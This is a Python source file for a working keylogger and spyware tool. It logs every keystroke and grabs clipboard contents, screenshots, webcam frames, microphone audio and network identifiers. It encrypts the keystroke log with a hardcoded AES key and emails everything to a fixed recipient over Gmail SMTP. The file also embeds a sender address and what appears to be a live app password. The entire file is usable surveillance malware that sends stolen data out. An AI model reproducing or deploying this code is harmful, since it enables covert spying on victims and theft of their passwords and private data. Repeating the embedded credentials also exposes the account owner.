import smtplib
import socket
import uuid
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
from pynput.keyboard import Key, Listener
from threading import Timer
import pyautogui
import time
import win32clipboard
import cv2
import numpy as np
import pyaudio
import wave
import os
from Crypto.Cipher import AES
import secrets

file_path = 'keystrokes.txt'
if not os.path.exists(file_path):
    open(file_path, 'w').close()

# Generate 32-byte (256-bit) AES key
key = "mysecretkey123456789123456789123".encode()

# Function to pad data to a multiple of AES block size
def pad(data):
    block_size = AES.block_size
    padding_size = block_size - len(data) % block_size
    padding = chr(padding_size) * padding_size
    return data + padding.encode()

# Function to encrypt data using AES encryption
def encrypt(data, key):
    data = pad(data)
    iv = os.urandom(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(data)

# Encrypt file
with open('keystrokes.txt', 'rb') as f:
    data = f.read()

encrypted_data = encrypt(data, key)

with open('keystrokes_encrypted.bin', 'wb') as f:
    f.write(encrypted_data)

# Function to record 15 seconds of webcam footage
def record_webcam():
    cap = cv2.VideoCapture(0)
    frames = []
    for i in range(15):
        ret, frame = cap.read()
        frames.append(frame)
        time.sleep(1)
    cap.release()
    footage = np.concatenate(frames, axis=1)
    cv2.imwrite("webcam_footage.png", footage)


# Function to record 15 seconds of microphone audio
def record_audio():
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 2
    RATE = 44100
    RECORD_SECONDS = 15
    WAVE_OUTPUT_FILENAME = "audio.wav"

    p = pyaudio.PyAudio()

    stream = p.open(format=FORMAT,
                    channels=CHANNELS,
                    rate=RATE,
                    input=True,
                    frames_per_buffer=CHUNK)

    frames = []

    for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
        data = stream.read(CHUNK)
        frames.append(data)

    stream.stop_stream()
    stream.close()
    p.terminate()

    wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
    wf.setnchannels(CHANNELS)
    wf.setsampwidth(p.get_sample_size(FORMAT))
    wf.setframerate(RATE)
    wf.writeframes(b''.join(frames))
    wf.close()


# Email details
email_address = "keyloggertest2023@gmail.com"
password = "xoywnvkjusfspstq"
to_email_address = "finleymcgonigle@gmail.com"

# File details
file_path = "keystrokes.txt"

# Get network information
ip_address = socket.gethostbyname(socket.gethostname())
network_name = socket.gethostname()
mac_address = ':'.join(hex(uuid.getnode())[i:i+2] for i in range(2,8))

# Timer details
interval = 5 # in seconds
duration = 20 # in seconds

# Function to handle key presses
def on_press(key):
    with open(file_path, 'a') as f:
        f.write(str(key))
        f.write('\n')

# Listener to monitor key presses
with Listener(on_press=on_press) as listener:

    # Function to email the file, clipboard data, and network information as attachments
    def email_file():
        with open(file_path, 'rb') as f:
            file_data = f.read()

        # Get clipboard data
        win32clipboard.OpenClipboard()
        try:
            clipboard_data = win32clipboard.GetClipboardData()
        except:
            clipboard_data = ""
        win32clipboard.CloseClipboard()

        # Email message
        message = MIMEMultipart()
        message['Subject'] = 'Keystroke Log'
        message['From'] = email_address
        message['To'] = to_email_address

        body = f"""\
Please find attached the keystroke log.

Network Information:
IP Address: {ip_address}
Network Name: {network_name}
MAC Address: {mac_address}

Clipboard Data:
{clipboard_data}

Thank you,
Your Keylogger"""

        message.attach(MIMEText(body))

        # Encrypt keystrokes file
        with open('keystrokes.txt', 'rb') as f:
            data = f.read()

        encrypted_data = encrypt(data, key)

        with open('keystrokes_encrypted.bin', 'wb') as f:
            f.write(encrypted_data)

        # Email attachment for encrypted keystrokes
        encrypted_keystrokes_attachment = MIMEBase('application', 'octet-stream')
        encrypted_keystrokes_attachment.set_payload(encrypted_data)
        encoders.encode_base64(encrypted_keystrokes_attachment)
        encrypted_keystrokes_attachment.add_header('Content-Disposition', f"attachment; filename=keystrokes_encrypted.bin")
        message.attach(encrypted_keystrokes_attachment)

        # Email attachment for screenshot
        screenshot = pyautogui.screenshot()
        screenshot_path = 'screenshot.png'
        screenshot.save(screenshot_path)
        with open(screenshot_path, 'rb') as f:
            screenshot_data = f.read()

        screenshot_attachment = MIMEBase('application', 'octet-stream')
        screenshot_attachment.set_payload(screenshot_data)
        encoders.encode_base64(screenshot_attachment)
        screenshot_attachment.add_header('Content-Disposition', f"attachment; filename=screenshot.png")
        message.attach(screenshot_attachment)

        # Record webcam and microphone data
        record_webcam()
        record_audio()

        # Attach webcam and microphone data to email
        with open("webcam_footage.png", 'rb') as f:
            webcam_data = f.read()

        with open("audio.wav", 'rb') as f:
            mic_data = f.read()

        webcam_attachment = MIMEBase('application', 'octet-stream')
        webcam_attachment.set_payload(webcam_data)
        encoders.encode_base64(webcam_attachment)
        webcam_attachment.add_header('Content-Disposition', f"attachment; filename=webcam_video.png")
        message.attach(webcam_attachment)

        mic_attachment = MIMEBase('application', 'octet-stream')
        mic_attachment.set_payload(mic_data)
        encoders.encode_base64(mic_attachment)
        mic_attachment.add_header('Content-Disposition', f"attachment; filename=mic_audio.wav")
        message.attach(mic_attachment)


        # SMTP connection and email sending
        try:
            with smtplib.SMTP('smtp.gmail.com', 587) as server:
                server.starttls()
                server.login(email_address, password)
                server.sendmail(email_address, to_email_address, message.as_string())
        except Exception as e:
            print(f"Error sending email: {e}")


    # Timer to email the file, clipboard data, and screenshot at specified intervals
    t1 = Timer(interval, email_file)
    t1.start()

    # Timer to stop the keylogger
    t2 = Timer(duration, listener.stop)
    t2.start()

    # Start the listener
    listener.join()